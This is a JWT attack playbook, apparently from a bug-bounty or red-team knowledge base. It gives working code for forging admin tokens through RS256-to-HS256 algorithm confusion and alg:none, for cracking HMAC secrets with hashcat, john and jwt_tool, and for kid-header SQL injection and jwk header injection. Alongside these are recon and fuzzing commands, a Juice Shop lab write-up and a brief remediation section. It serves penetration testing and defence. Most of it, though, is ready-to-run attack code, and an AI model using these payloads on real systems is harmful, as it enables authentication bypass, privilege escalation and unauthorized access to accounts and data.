# JWT Vulnerability Playbook

**Category:** Authentication / Cryptographic Failure
**Typical Severity:** High–Critical
**CVSS Range:** 7.5–9.8
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)

---

## Overview

JSON Web Tokens are widely used for authentication and API authorization. JWT vulnerabilities exploit weaknesses in how servers verify token signatures. The most impactful attacks produce **forged admin tokens with no credential requirement**. Key attack classes:

1. **Algorithm Confusion (RS256→HS256)**: Use the RSA public key as an HMAC secret
2. **`alg: none`**: Strip the signature entirely
3. **Weak HMAC secret**: Brute-force the signing secret offline
4. **`kid` injection**: Manipulate the Key ID header for SQL injection or SSRF
5. **`jwk` header injection**: Supply your own public key in the token header
6. **Claim manipulation**: Modify claims without invalidating the signature (when sig check is skipped)

---

## Real-World Impact

- **Complete authentication bypass**: Forge admin tokens with zero credentials
- **Privilege escalation**: Change `role: "user"` to `role: "admin"` in token claims
- **Persistent access**: Forge tokens with `exp: 9999999999` (effectively non-expiring)
- **Cross-tenant access**: Change `tenantId` or `organizationId` claims
- **SQL injection via kid header**: Inject SQL into the `kid` parameter to retrieve arbitrary signing keys

---

## Recon Methodology

### Step 1 — Obtain a valid JWT

```bash
# Log in and capture the JWT from:
# - Authorization header (Bearer <token>)
# - Cookie (session=, token=, jwt=, auth=)
# - Response body ({"access_token": "..."})

# Decode without verification to read claims
echo "eyJ..." | cut -d. -f1 | base64 -d 2>/dev/null | jq
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

### Step 2 — Analyze the token header

```bash
# Decode the header (first part)
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d | jq
# Output: {"alg": "RS256", "typ": "JWT"}

# Note the algorithm — RS256 is a target for algorithm confusion
# Note any kid, jwk, jku, x5u headers — all attack surfaces
```

### Step 3 — Find the public key

```bash
# Common locations for RSA public key exposure:
curl "https://target.com/.well-known/jwks.json"
curl "https://target.com/oauth/jwks"
curl "https://api.target.com/v1/keys"
curl "https://target.com/encryptionkeys/jwt.pub"     # ← exact path found in Boozt lab
curl "https://target.com/.well-known/openid-configuration"
curl "https://target.com/api/auth/public-key"

# Also check:
# - /encryptionkeys/ directory listing
# - /support/logs/
# - Source code repositories (GitHub)
# - JavaScript bundles (grep for "-----BEGIN PUBLIC KEY-----")
```

### Step 4 — Check for `alg: none` support

```bash
# Create a token with alg:none and no signature
# Header: {"alg":"none","typ":"JWT"} → base64url encode
# Payload: modify claims → base64url encode
# Signature: empty
# Format: header.payload.

python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','exp':9999999999}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

---

## Testing Methodology

### Attack 1 — Algorithm Confusion (RS256 → HS256)

This is the most powerful JWT attack. When a server uses RS256 (asymmetric), the public key is public. If you change `alg` to `HS256` (symmetric), some libraries will use the RSA public key as the HMAC secret — which the attacker knows.

```python
import jwt  # pip install pyjwt

# Read the public key (from any source found in recon)
with open('jwt_public.pem', 'r') as f:
    public_key = f.read()

# Forge a token with modified claims, signed with HS256 using the PUBLIC key as secret
forged = jwt.encode(
    {'sub': 'admin', 'role': 'admin', 'email': 'admin@target.com', 'exp': 9999999999},
    public_key,        # RSA public key used as HMAC secret
    algorithm='HS256'  # Changed from RS256
)
print(forged)
```

```bash
# Test the forged token
curl "https://api.target.com/admin/users" \
  -H "Authorization: Bearer <forged_token>"
```

### Attack 2 — `alg: none`

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

header = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"sub": "1", "role": "admin", "exp": 9999999999})
token = f"{header}.{payload}."  # Empty signature

# Try variations
tokens = [
    f"{header}.{payload}.",
    f"{b64url({'alg':'None'})}.{payload}.",
    f"{b64url({'alg':'NONE'})}.{payload}.",
    f"{b64url({'alg':'nOnE'})}.{payload}.",
]
```

### Attack 3 — Brute-Force Weak HMAC Secret

```bash
# hashcat — GPU-accelerated JWT cracking
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# john
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

Common weak secrets to test manually:
```
secret, password, 123456, admin, test, key, jwt_secret, your-256-bit-secret,
HS256, RS256, secret123, mysecretkey, supersecret, changeme
```

### Attack 4 — `kid` Header Injection

```bash
# SQL injection via kid
# kid value: ' UNION SELECT 'attacker_secret' --
# If server queries DB for the key: SELECT key FROM keys WHERE id = '{kid}'

python3 -c "
import jwt, json, base64

# Craft kid that returns a known value
kid_sqli = \"' UNION SELECT 'attacker_key'-- \"

header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','kid':kid_sqli}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()

# Sign with the value that the SQL injection returns
import hmac, hashlib
sig = hmac.new(b'attacker_key', f'{header}.{payload}'.encode(), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'{header}.{payload}.{sig_b64}')
"
```

### Attack 5 — `jwk` Header Injection

```bash
# Generate RSA key pair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# Include your public key in the token header as 'jwk'
# Sign with your private key
# If server uses the embedded 'jwk' to verify → you control verification
python3 jwt_tool.py <token> --exploit jwk --key attacker.pem
```

---

## Common Endpoints to Test

| Location | What to Look For |
|---|---|
| `/.well-known/jwks.json` | Public keys, algorithm disclosure |
| `/encryptionkeys/` | Key files exposed via directory listing |
| `/oauth/token` | Token issuance, algorithm in response |
| `/api/auth/refresh` | Refresh token handling |
| `/admin/*` | Escalation target after forging admin token |
| JS bundles | Hardcoded secrets, public key material |
| GitHub/GitLab repos | Leaked JWT secrets in code/config |

---

## Payload Examples

### jwt_tool (All-in-One)

```bash
# Install
pip3 install jwt_tool

# Scan for common vulnerabilities
python3 jwt_tool.py <token> -t "https://api.target.com/auth/check" -rh "Authorization: Bearer *JWT*" -M pb

# Algorithm confusion attack
python3 jwt_tool.py <token> --exploit alg --key public_key.pem \
  -t "https://api.target.com/admin" -rh "Authorization: Bearer *JWT*"

# None algorithm
python3 jwt_tool.py <token> --exploit alg -A none

# Tamper a claim
python3 jwt_tool.py <token> -T -p '{"role":"admin"}'
```

---

## Automation Ideas

```bash
# jwt_tool playbook mode scans all common attacks
python3 jwt_tool.py <token> -M pb

# Check JWKS endpoint on all subdomains
subfinder -d target.com -silent | httpx -path "/.well-known/jwks.json" -mc 200

# Find exposed key files
ffuf -u "https://target.com/FUZZ" \
  -w <(echo -e "encryptionkeys/\nencryptionkeys/jwt.pub\n.well-known/jwks.json\napi/keys\noauth/keys") \
  -mc 200
```

---

## Real Bug Bounty Examples

### Example 1 — Auth0 (~$5,000)
Algorithm confusion (RS256→HS256) found on a widely-used identity provider. The JWKS endpoint was public, the library accepted HS256 tokens using the RSA public key as secret.

### Example 2 — Portswigger Labs / Real World
Multiple real-world applications using Node.js `jsonwebtoken` library (versions < 9.0.0) were vulnerable to `alg: none` bypass due to incorrect option defaults.

### Example 3 — Firebase / GCP Misconfig
Application using Firebase Auth validated JWT signature but used the unverified `email` claim from the payload to determine user identity — allowing attackers to include any email in a self-signed token.

---

## Lab / Program Examples

### OWASP Juice Shop — Lab Mission 2026-03-12-002

**Source:** RedTeam mission artifact `~/RedTeam/missions/juiceshop/2026-03-12-002/exploit/`
**Severity:** CRITICAL (CVSS 9.1)

**Finding:** The Juice Shop application exposes its JWT RSA public key at `/encryptionkeys/jwt.pub`. The server accepted HS256-signed tokens using the RSA public key as the HMAC secret (classic algorithm confusion). The forged token included `exp: 9999999999` — effectively non-expiring.

**Exploit steps:**
1. Retrieved RSA public key from `http://10.10.30.130:3000/encryptionkeys/jwt.pub` (unauthenticated directory listing)
2. Forged admin token: `alg: HS256`, `email: admin@juice-sh.op`, signed with the public key as HMAC secret
3. Used forged token to access all admin API endpoints

**Root cause:** The `/encryptionkeys/` directory was web-accessible with no authentication. The JWT library's algorithm confusion vulnerability allowed the public key to be used as a symmetric secret.

**Defensive gap:** Remove `/encryptionkeys/` from the web root. Enforce RS256-only in JWT middleware — reject HS256 tokens entirely. Implement key rotation.

---

## Remediation

```javascript
// Node.js — enforce algorithm allowlist
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256']  // NEVER include 'none', never allow HS256 if using RS256
});

// Rotate the RSA key pair after any exposure
// Remove all key material from web-accessible directories
// Use short-lived tokens (15–60 minute exp) with refresh tokens
```

```bash
# Remove exposed key directories
# Ensure /encryptionkeys/, /jwks/, /keys/ are either:
# - Behind authentication
# - Blocked at the CDN/WAF level
# - Not web-accessible at all
```
